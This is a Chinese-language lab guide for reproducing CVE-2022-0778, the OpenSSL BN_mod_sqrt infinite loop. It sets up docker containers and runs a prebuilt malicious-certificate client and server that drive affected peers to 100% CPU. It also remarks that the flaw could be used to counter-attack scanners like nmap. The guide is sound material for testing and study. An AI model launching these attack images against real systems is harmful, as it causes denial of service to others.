# CVE-2022-0778

OpenSSL 是一个安全套接字层密码库，囊括主要的密码算法、常用的密钥和证书封装管理功能及SSL协议，并提供丰富的应用程序供测试或其它目的使用。

该漏洞由于计算模平方根的 BN_mod_sqrt() 函数错误导致，该错误可能导致它对于非素数模数无限循环，最终导致拒绝服务。

参考链接：

- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-0778
- https://github.com/yywing/cve-2022-0778
- https://www.cnblogs.com/logchen/p/16030515.html

## 环境搭建

运行如下命令启动了：
- 受漏洞影响的服务端（监听 12345 端口）：OpenSSL 1.1.0f， python 服务器(开启了客户端证书验证)
- 利用漏洞的恶意服务端（监听 12346 端口：返回恶意证书的 go https server

```
docker-compose up -d
```

环境启动后
- `curl -k -v https://localhost:12345` 会提示客户端证书错误（因为开启了客户端证书校验）。
- `nc -v localhost 12346` 显示端口监听（直接 curl 的话如果本地 openssl 再影响范围会直接 cpu 100%）

## 漏洞复现

运行：
```
# attack
docker run -it --rm --entrypoint badclient yywing/cve-2022-0778 --addr host.docker.internal:12345

docker stats --no-stream

CONTAINER ID   NAME                        CPU %     MEM USAGE / LIMIT     MEM %     NET I/O           BLOCK I/O   PIDS
3d948d277a89   cve-2022-0778-server-1      99.87%    7.398MiB / 50.15GiB   0.01%     4.38kB / 5.21kB   0B / 0B     1
ba9d7fd208c3   cve-2022-0778-badserver-1   0.00%     2.77MiB / 50.15GiB    0.01%     2.5kB / 1.55kB    0B / 0B     5
```
当一个受影响的服务器且开启客户端证书校验的时候，一个恶意客户端可以通过发送恶意证书，导致服务端 CPU 飙升。

运行：
```
# client
docker run -it --rm yywing/cve-2022-0778-target curl https://host.docker.internal:12346
# or
docker run -it --rm yywing/cve-2022-0778-target python -c "import http.client;http.client.HTTPSConnection('host.docker.internal', 12345).request('GET', '/')"

docker stats --no-stream

CONTAINER ID   NAME                        CPU %     MEM USAGE / LIMIT     MEM %     NET I/O           BLOCK I/O   PIDS
8ffae845cf96   recursing_dhawan            100.08%   2.801MiB / 50.15GiB   0.01%     2.17kB / 997B     0B / 0B     1
de385c0e76a3   cve-2022-0778-server-1      0.00%     7.375MiB / 50.15GiB   0.01%     878B / 0B         0B / 0B     1
88f476ad4581   cve-2022-0778-badserver-1   0.00%     2.758MiB / 50.15GiB   0.01%     1.78kB / 1.16kB   0B / 0B     5
```
当一个受影响的客户端访问到一个恶意服务器的时候，恶意服务器可以通过发送恶意证书，导致客户端 CPU 飙升。

注：
1. nmap 受影响
2. 感觉红队视角漏洞比较鸡肋，但是蓝队视角用来反制感觉用处很大
